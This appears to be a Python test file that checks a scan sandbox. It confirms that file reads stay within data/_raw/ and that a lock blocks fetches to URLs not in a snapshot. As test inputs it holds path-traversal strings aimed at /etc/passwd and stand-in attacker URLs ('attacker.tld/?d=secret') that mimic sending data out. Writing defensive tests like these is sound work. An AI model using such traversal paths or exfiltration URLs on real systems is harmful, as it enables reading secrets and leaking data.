"""The scan session can't read outside data/_raw/ or fetch an unstaged URL."""

from __future__ import annotations

import common
import pytest
import verify_citations

REAL_FETCH = common.fetch_readable  # captured before the sandbox fixture stubs it


def test_raw_file_stays_inside_data_raw(sandbox):
    (sandbox / "data/_raw").mkdir()
    (sandbox / "data/_raw/c1.txt").write_text("body")
    assert common.raw_file("data/_raw/c1.txt") == (sandbox / "data/_raw/c1.txt").resolve()
    for escape in ("/etc/passwd", "data/_raw/../../../etc/passwd", "config.yaml", "", None):
        assert common.raw_file(escape) is None


def test_grounding_never_reads_an_absolute_raw_path(sandbox, tmp_path):
    secret = tmp_path / "outside-secret.txt"
    secret.write_text("hunter2")
    entry = {"raw_path": str(secret), "article_url": "manual:none"}
    assert verify_citations.source_text_for(entry) is None


def test_scan_lock_allows_only_snapshot_urls(sandbox, monkeypatch):
    common.save_json(sandbox / "data" / common.SCAN_URL_SNAPSHOT, {"c1": "https://ok.example/a"})
    common.check_scan_lock("https://attacker.tld/?d=x")  # unlocked: anything goes
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    common.check_scan_lock("https://ok.example/a")
    with pytest.raises(PermissionError):
        common.check_scan_lock("https://attacker.tld/?d=x")


def test_locked_fetch_refuses_before_any_request(sandbox, monkeypatch):
    import requests

    def no_network(*a, **k):
        raise AssertionError("network reached: the scan lock did not run first")

    monkeypatch.setattr(requests, "get", no_network)
    monkeypatch.setenv(common.SCAN_LOCK_ENV, "1")
    with pytest.raises(PermissionError):
        REAL_FETCH("https://attacker.tld/?d=secret")
